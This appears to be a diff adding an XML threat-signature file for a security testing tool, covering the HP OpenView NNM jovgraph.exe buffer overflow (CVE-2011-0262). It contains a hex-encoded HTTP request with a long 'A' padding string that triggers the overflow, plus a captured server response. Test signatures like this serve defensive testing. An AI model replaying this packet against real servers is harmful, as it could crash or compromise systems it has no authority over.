@@ -1,0 +1,88 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="HP OpenView Network Node Manager ovutil.dll stringToSeconds Buffer Overflow"/>
+    <EngDesc display="true" value="A buffer overflow vulnerability exists in HP OpenView Network Node Manager (NNM). The vulnerability is due to a boundary error in the &lt;italic&gt;stringToSeconds&lt;/italic&gt; function defined in the ovutil.dll when processing crafted HTTP request parameters.A remote unauthenticated attacker can exploit this vulnerability by sending a crafted HTTP request to the jovgraph.exe CGI program on a target server, potentially causing arbitrary code to be injected and executed within the security context of the Internet Guest Account."/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+    </Intent>
+    <Protocol display="true" value="HTTP,HTTPS"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="HP"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="OpenView_Network_Node_Manager_(OV_NNM)"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="7.51/7.53"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20110210-01"/>
+    <CVEID display="true" value="CVE-2011-0262"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Jim"/>
+    <ID display="true" value="af80d49e0e8e016bcc0cf20ef35171a5"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="network"/>
+    <AccessComplexity display="false" value="MEDIUM"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="634342271721092664"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1298629817" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="srcIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="F"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+    </for>
+    <for index="B">
+      <for index="D"/>
+      <for index="F"/>
+      <for index="E"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:F6:F6:62" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="03E9" Identification="6669" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="6F13" srcIP="$srcIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="40173" destPort="$HTTPdestPort" SeqNumber="4302E9A3" AckNumber="AA4BB30C" HeaderLength="08" WindowSize="002E" Checksum="449F" UrgentPointer="0000" Options="0101080AC68C8FC600000000" Payload="474554202F4F764367692F6A6F7667726170682E6578653F6170703D496E2B4F75742B4F6374657473266163743D47726170682B54726166666963266172673D2D7469746C652B25323247726170683A496E2B4F75742B747261666669632532322D646973706C617957696474682B31414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141412B2D6D69622B2532324966496E4F63746574733A3A313A3A3A3A3A3A2C49664F75744F63746574733A3A313A3A3A3A3A3A2532322B2530392B2B2B2B242537624F567753656C656374696F6E732537642673656C3D3137322E31362E382E3120485454502F312E310D0A486F73743A203137322E31362E382E310D0A557365722D4167656E743A204D6F7A696C6C612F352E30202857696E646F77733B20553B2057696E646F7773204E5420352E313B20656E2D55533B2072763A312E392E302E3829204765636B6F2F323030393033323630392046697265666F782F332E302E380D0A4163636570743A20746578742F68746D6C2C6170706C69636174696F6E2F7868746D6C2B786D6C2C6170706C69636174696F6E2F786D6C3B713D302E392C2A2F2A3B713D302E380D0A4163636570742D4C616E67756167653A20656E2D75732C656E3B713D302E350D0A4163636570742D456E636F64696E673A20677A69702C6465666C6174650D0A4163636570742D436861727365743A2049534F2D383835392D312C7574662D383B713D302E372C2A3B713D302E370D0A4B6565702D416C6976653A203330300D0A436F6E6E656374696F6E3A206B6565702D616C6976650D0A436F6F6B69653A204F764F534C6F63616C653D456E676C6973685F556E697465642B5374617465732E313235323B204F764163636570744C616E673D656E2D75733B204F764A6176614C6F63616C653D656E5F55532E4370313235323B204F7657656253657373696F6E3D32333631393A416E79557365722533610D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="00:0C:29:F6:F6:62" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="01B1" Identification="3412" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="63A2" srcIP="$destIP" destIP="$srcIP" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="40173" SeqNumber="AA4BB30C" AckNumber="4302ED58" HeaderLength="08" WindowSize="F73B" Checksum="5B0B" UrgentPointer="0000" Options="0101080A000005CEC68C8FC5" Payload="485454502F312E3120323030204F4B0D0A507261676D613A206E6F2D63616368650D0A436F6E74656E742D547970653A20746578742F68746D6C3B20636861727365743D49534F2D383835392D310D0A436F6E74656E742D4C616E67756167653A20656E2D75730D0A457870697265733A205468752C203031204A616E20313937302030303A30303A303120474D540D0A5365727665723A204D6963726F736F66742D4949532F362E300D0A5365742D636F6F6B69653A204F7657656253657373696F6E3D373935393A416E79557365722533613B20706174683D2F0D0A496E666F726D6174696F6E3A2028632920436F7079726967687420313939302D32303130204865776C6574742D5061636B61726420446576656C6F706D656E7420436F6D70616E792C204C500D0A582D506F77657265642D42793A204153502E4E45540D0A446174653A204D6F6E2C2031342046656220323031312031353A30383A353120474D540D0A436F6E6E656374696F6E3A20636C6F73650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
